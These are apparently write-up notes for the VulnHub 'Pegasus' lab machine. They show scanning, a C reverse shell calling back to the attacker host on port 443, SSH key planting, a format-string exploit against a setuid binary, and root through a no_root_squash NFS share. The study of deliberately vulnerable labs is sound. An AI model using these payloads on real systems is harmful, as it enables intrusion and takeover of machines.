https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/


https://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/

https://g0blin.co.uk/pegasus-vulnhub-writeup/


https://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/



```console
└─$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.39
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-31 16:35 CEST
Nmap scan report for 192.168.110.39
Host is up (0.00013s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 77:89:5b:52:ed:a5:58:6e:8e:09:f3:9e:f1:b0:d9:98 (DSA)
|   2048 d6:62:f5:12:31:36:ed:08:2c:1a:5e:9f:3c:aa:1f:d2 (RSA)
|_  256 c5:f0:be:e5:c0:9c:28:6e:23:5c:48:38:8b:4a:c4:43 (ECDSA)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35757/tcp   status
|   100024  1          50765/udp6  status
|   100024  1          52937/udp   status
|_  100024  1          60789/tcp6  status
8088/tcp  open  http    nginx 1.1.19
|_http-server-header: nginx/1.1.19
|_http-title: Pegasus Technologies - Under Construction
35757/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:88:F8:40 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.12 ms 192.168.110.39

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds
```

```console
└─$ dirb http://192.168.110.39:8088 -X .php,.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jul 31 16:37:29 2021
URL_BASE: http://192.168.110.39:8088/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.php,.txt) | (.php)(.txt) [NUM = 2]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.110.39:8088/ ----
+ http://192.168.110.39:8088/submit.php (CODE:200|SIZE:19)                                                                                                                                 

```
```console



└─$ wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404  http://192.168.110.39:8088/FUZZ.php                                           130 ⨯
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.110.39:8088/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                    
=====================================================================

000000185:   200        0 L      4 W        19 Ch       "submit"                                                                                                                   
000089234:   200        14 L     58 W       488 Ch      "codereview"    
```


Upload code C

```c
//code.c
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr("192.168.110.1");
    sa.sin_port = htons(443);

    s = socket(AF_INET, SOCK_STREAM, 0); 
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0; 
}

```
```console
nc -lvp 443
cp key.pub /home/mike/.ssh/authorized_keys
ssh mike@192.168.110.39
```

```bash
#!/bin/sh
#
# I am a 'human' reviewing submitted source code :)
#
#check_code.sh

SOURCE_CODE="/opt/code_review/code.c"

# Kill whatever is running after 120 seconds
TIMEOUT=120

while true; do
    echo "# Checking for code.c..."
    if [ -f $SOURCE_CODE ]; then
        echo " # Compile..."
        /usr/bin/gcc -o /home/mike/code $SOURCE_CODE
        /bin/chmod 755 /home/mike/code
        echo " # Run"
        (/home/mike/code) & PID=$!
        # Let the code run for $TIMEOUT, then kill it if still executing
        (/bin/sleep $TIMEOUT && kill -9 $PID; echo " # Killed ./code") 2>/dev/null & WATCHER=$!
        # Kill the watched (code stopped executing before $TIMEOUT)
        wait $PID 2>/dev/null && kill -9 $WATCHER; echo " # Killed watcher"
        echo " # Cleanup..."
        /bin/rm -f /home/mike/code $SOURCE_CODE
    fi
    /bin/sleep 1
done
```



```console
-rwsr-xr-x 1 john john  6606 Nov 28  2014 my_first
```
```console
./my_first
mike@pegasus:~$ ./my_first 
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 1

Enter first number: 1
Enter second number: %x
Error details: bfa858dc
```


```console
mike@pegasus:~$ cat /proc/sys/kernel/randomize_va_space 
2

gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled

mike@pegasus:~$ ldd  ./my_first 
        linux-gate.so.1 =>  (0xb77d9000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7628000)
        /lib/ld-linux.so.2 (0xb77da000)
mike@pegasus:~$ ldd  ./my_first 
        linux-gate.so.1 =>  (0xb773e000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb758d000)
        /lib/ld-linux.so.2 (0xb773f000)

```
```console
gdb-peda$ vmmap
Start      End        Perm      Name
0x08048000 0x08049000 r-xp      /home/mike/my_first
0x08049000 0x0804a000 rw-p      /home/mike/my_first
0xb759b000 0xb759c000 rw-p      mapped
0xb759c000 0xb7740000 r-xp      /lib/i386-linux-gnu/libc-2.15.so
0xb7740000 0xb7742000 r--p      /lib/i386-linux-gnu/libc-2.15.so
0xb7742000 0xb7743000 rw-p      /lib/i386-linux-gnu/libc-2.15.so
0xb7743000 0xb7746000 rw-p      mapped
0xb774b000 0xb774d000 rw-p      mapped
0xb774d000 0xb774e000 r-xp      [vdso]
0xb774e000 0xb776e000 r-xp      /lib/i386-linux-gnu/ld-2.15.so
0xb776e000 0xb776f000 r--p      /lib/i386-linux-gnu/ld-2.15.so
0xb776f000 0xb7770000 rw-p      /lib/i386-linux-gnu/ld-2.15.so
0xbfc71000 0xbfc92000 rw-p      [stack]
gdb-peda$ ropgadget 
ret = 0x8048382
popret = 0x80487e3
pop2ret = 0x8048847
pop3ret = 0x8048846
pop4ret = 0x8048845
leaveret = 0x8048398
addesp_44 = 0x8048842
```

```console
I've crafted something simple in C, treating it as a refresher course for myself (it's been YEARS since I last coded something up) - would you mind reviewing it for me?

I've put the binary in your home directory for convenience. You can also find the source code under our local git repo: my_first.git

Thanks!
John
```


```console
git clone ssh://mike@192.168.110.39:/opt/git/my_first.git

```
```c

#include <stdio.h>
#include <stdlib.h>

int calculator();
int string_replay();
int string_reverse();
int quit();

int main()
{
    char selection[5];
    int sel;
    char * err_check;

    printf("WELCOME TO MY FIRST TEST PROGRAM\n");
    printf("--------------------------------\n");
    printf("Select your tool:\n");
    printf("[1] Calculator\n");
    printf("[2] String replay\n");
    printf("[3] String reverse\n");
    printf("[4] Exit\n\n");
    
    do
    {
        printf("Selection: ");
        if (fgets(selection, sizeof selection, stdin) != NULL)
        {
            sel = strtol(selection, &err_check, 10);
            switch (sel)
            {
                case 1:
                {
                    calculator();
                    break;
                }
                case 2:
                {
                    string_replay();
                    break;
                }
                case 3:
                {
                    string_reverse();
                    break;
                }
                case 4:
                {
                    quit();
                    break;
                }
                default:
                {
                    printf("\nError: Incorrect selection!\n\n");
                }
            }
        }
        else
        {
            printf("\nBye!\n");
            break;
        }
    }
    while (sel != 4);
}

int calculator()
{
    char numberA[50];
    char numberB[50];
    char * err_check;
    printf("\nEnter first number: ");
    if (fgets(numberA, sizeof numberA, stdin) != NULL)
    {
        printf("Enter second number: ");
        if (fgets(numberB, sizeof numberB, stdin) != NULL)
        {
            int numA = strtol(numberA, &err_check, 10);
            int numB = strtol(numberB, &err_check, 10); 
            if (*err_check != '\n')
            {
                printf("Error details: ");
                printf(err_check);
                printf("\n");
                return 1;
            }
            else
            {
                int sum = numA + numB;
                printf("Result: %i + %i = %i\n\n", numA, numB, sum);
                return 0;
            }
        }
        else
        {
            printf("\nBye!\n");
            return 1;
        }
    }
    else
    {
        printf("\nBye!\n");
        return 1;
    }
}

int string_replay()
{
    char input[100];
    printf("\nEnter a string: ");
    if (fgets(input, sizeof input, stdin) != NULL)
    {
        printf("You entered: %s\n", input);
    }
    else
    {
        printf("\nBye!\n");
        return 1;
    }
    return 0;
}

int string_reverse()
{
    //TODO
    printf("\nError: Not yet implemented!\n\n");
    return 1;
}

int quit()
{
    printf("\nGoodbye!\n");
    return 0;
}


```

```console
#desactive ALSR
ulimit -s unlimited
```



```python
#cat exploit.py 
import struct

def p(x):
        return struct.pack('<L', x)

input0 = "1\n\10\n"
input0 += "AAAA"
input0 += ".%x"*8
input0 += "\n"
input0 += "4\n"


input1 = "1\n\10\n"
#input1 += "AAAA"
#input1 += ".%x"*8
#input1 += "0x%8$n"

system =p(0x40069060)
printf = p(0x8049bfc)
printf_0 = p(0x8049bfc)
printf_2 = p(0x8049bfc+2)
input1 += printf_0
input1 += printf_2
#0x9060
input1 += "%36952x%8$hn"
#0x4006
input1 += "%44966x%9$hn"



input1 += "\n"
input1 += "4\n"

print input1

```

```console
mike@pegasus:~$ export PATH=$PATH:/home/mike
mike@pegasus:~$ python exploit.py | ./my_first 
```

```console
└─$ nc -nlvp 443            
listening on [any] 443 ...
connect to [192.168.110.1] from (UNKNOWN) [192.168.110.39] 39169
id
uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)

cp /home/mike/.ssh/authorized_keys /home/john/.ssh/authorized_keys
chmod 600 /home/john/.ssh/authorized_keys

```

```console
└─$ ssh john@192.168.110.39  
john@pegasus:~$ sudo -l
Matching Defaults entries for john on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on this host:
    (root) NOPASSWD: /usr/local/sbin/nfs
john@pegasus:~$ 
```

```console
john@pegasus:~$ cat /etc/exports | grep  -v ^#
/opt/nfs        *(rw,sync,crossmnt,no_subtree_check,no_root_squash)

```

```console
john@pegasus:~$ sudo /usr/local/sbin/nfs start

```
```terminal
└─$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.39
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-02 17:04 CEST
Nmap scan report for 192.168.110.39
Host is up (0.00019s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 77:89:5b:52:ed:a5:58:6e:8e:09:f3:9e:f1:b0:d9:98 (DSA)
|   2048 d6:62:f5:12:31:36:ed:08:2c:1a:5e:9f:3c:aa:1f:d2 (RSA)
|_  256 c5:f0:be:e5:c0:9c:28:6e:23:5c:48:38:8b:4a:c4:43 (ECDSA)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      43341/udp6  mountd
|   100005  1,2,3      45091/tcp   mountd
|   100005  1,2,3      52893/udp   mountd
|   100005  1,2,3      59781/tcp6  mountd
|   100021  1,3,4      33103/udp6  nlockmgr
|   100021  1,3,4      35516/tcp6  nlockmgr
|   100021  1,3,4      41402/udp   nlockmgr
|   100021  1,3,4      46657/tcp   nlockmgr
|   100024  1          42982/tcp   status
|   100024  1          43277/udp6  status
|   100024  1          45001/udp   status
|   100024  1          46146/tcp6  status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  2-3 (RPC #100227)
8088/tcp  open  http     nginx 1.1.19
|_http-server-header: nginx/1.1.19
|_http-title: Pegasus Technologies - Under Construction
33433/tcp open  mountd   1-3 (RPC #100005)
35948/tcp open  mountd   1-3 (RPC #100005)
42982/tcp open  status   1 (RPC #100024)
45091/tcp open  mountd   1-3 (RPC #100005)
46657/tcp open  nlockmgr 1-4 (RPC #100021)
MAC Address: 08:00:27:88:F8:40 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.19 ms 192.168.110.39

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.69 seconds

```
```console
└─$ sudo mount 192.168.110.39:/opt/nfs nfs
```

```console
john@pegasus:~$ cat asroot.c 
#include <stdio.h>

void main() {
        setuid(0);
        setgid(0);
        system("/bin/sh");
}
john@pegasus:~$ gcc asroot.c  -o asroot
```
```console
john@pegasus:~$ xxd -p asroot

```
```console
└─$ cat asroot.xxd | xxd -p -r >/tmp/asroot
└─$ sudo cp /tmp/asroot asroot
└─$ sudo chmod 4755 asroot   
```
```console
john@pegasus:/opt/nfs$ ls -al asroot
-rwsr-xr-x 1 root root 7238 Aug  3 06:46 asroot
john@pegasus:/opt/nfs$ ./asroot 
# id
uid=0(root) gid=0(root) groups=0(root),1000(john)
```


